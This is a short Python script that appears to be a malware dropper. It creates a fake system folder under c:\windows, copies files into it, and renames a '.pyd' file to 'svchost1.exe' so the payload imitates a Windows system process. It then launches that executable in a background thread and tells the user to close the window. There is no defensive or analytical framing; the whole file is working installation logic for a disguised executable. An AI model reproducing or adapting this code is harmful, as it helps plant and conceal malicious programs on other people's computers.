# -*- coding: gbk -
import os
import threading
import time
import shutil
import glob

target_tree="c:\\windows\\winConfigs\\alg"
mk_dir="mkdir c:\\windows\\winConfigs\\alg"

filename='\\svchost1.pyd'
filename2='\\svchost1.exe'
class mythread(threading.Thread):
	def __init__(self,num):
		threading.Thread.__init__(self)
		self.num = num
	def run(self):
		os.system(target_tree + filename2)

if os.path.exists(target_tree):
	pass
else:
	os.system(mk_dir)
	for files in glob.glob(os.getcwd()+"\\alg\\*.*"):
		shutil.copy(files,target_tree)

	os.renames(target_tree + filename,target_tree + filename2)
	t = mythread(1)
	t.setDaemon(True)
	t.start()
	print("请关闭该窗口...")
	#os.system("pause")


		




